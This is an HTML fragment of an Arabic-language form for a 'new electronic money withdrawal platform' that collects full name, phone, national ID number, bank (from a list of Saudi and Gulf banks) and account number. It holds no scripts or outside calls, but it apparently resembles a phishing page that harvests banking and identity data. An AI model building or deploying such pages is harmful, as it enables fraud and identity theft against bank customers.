    <div class="head-title">
        <h1>منصة سحب الاموال الالكترونية الجديدة</h1>
    </div>
    <div dir="rtl">
        <form action="" method="post">
            <div class="title-1">
                <img src="/image/png/arrow-right.png" alt="">
                <h1>لسحب اموالك من فضلك املاء الاستمارة المرفقه</h1>
            </div>

            <div>
                <input class="input-detail" name="name" id="name" type="text" placeholder="الاسم الكامل">
            </div>
            <div>
                <input class="input-detail" name="phone" id="phone" type="text" placeholder="رقم الهاتف">
            </div>
            <div>
                <input class="input-detail" name="id" id="id" type="text" placeholder="رقم الهوية">
            </div>
            <div>
                <select class="input-detail" name="bank" id="banks-name">
                    <option selected="selected">Select Your Beverage</option>
                    <option value="">بنك الرياض</option>
                    <option value="">بنك الجزيرة</option>
                    <option value="">بنك السعودي للاستثمار</option>
                    <option value="">بنك الراجحي</option>
                    <option value="">بنك البلاد</option>
                    <option value="">بنك سامبا</option>
                    <option value="">بنك العربي</option>
                    <option value="">بنك الاهلي</option>
                    <option value="">بنك الانماء</option>
                    <option value="">بنك السعودي الفرنسي</option>
                    <option value="">بنك ساب</option>
                    <option value="">بنك السعودي الهولندي</option>
                    <option value="">بنك الخليج الدولي</option>
                    <option value="">بنك الوطني</option>
                    <option value="">بنك الامارات دبي الوطني</option>
                </select>
                <div>
                    <input class="input-detail" id="account" type="text" placeholder="رقم الحساب">
                </div>
            </div>
            <input type="submit" value="ارسل">
        </form>
    </div>
